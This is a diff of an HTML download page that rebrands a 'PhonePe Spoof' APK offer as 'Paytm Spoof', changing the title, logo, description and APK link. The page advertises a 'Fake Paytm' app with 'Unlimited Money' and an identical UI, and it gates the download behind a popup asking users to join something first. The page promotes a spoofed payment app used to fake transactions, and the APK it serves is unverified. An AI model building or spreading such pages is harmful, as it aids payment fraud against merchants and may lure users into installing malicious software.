@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>APK Download - PhonePe Spoof</title>
+  <title>APK Download - Paytm Spoof</title>
   <style>
     * {
       margin: 0;
@@ -120,11 +120,11 @@
   <div class="glow"></div>
   <div class="container">
     <div class="logo">
-      <img src="IMG_1921.png" alt="App Logo">
+      <img src="logo.png" alt="App Logo">
     </div>
-    <div class="title">PhonePe Spoof</div>
+    <div class="title">Paytm Spoof</div>
     <div class="description">
-      • Fake PhonePe 🔥<br>
+      • Fake Paytm 🔥<br>
       • Unlimited Money 😍<br>
       • Same to Same UI 🤩<br>
     </div>
@@ -147,7 +147,7 @@
       if (!joined) {
         document.getElementById('popup').style.display = 'block';
       } else {
-        window.location.href = 'phonepe.apk';
+        window.location.href = 'paytm.apk';
       }
     });
 
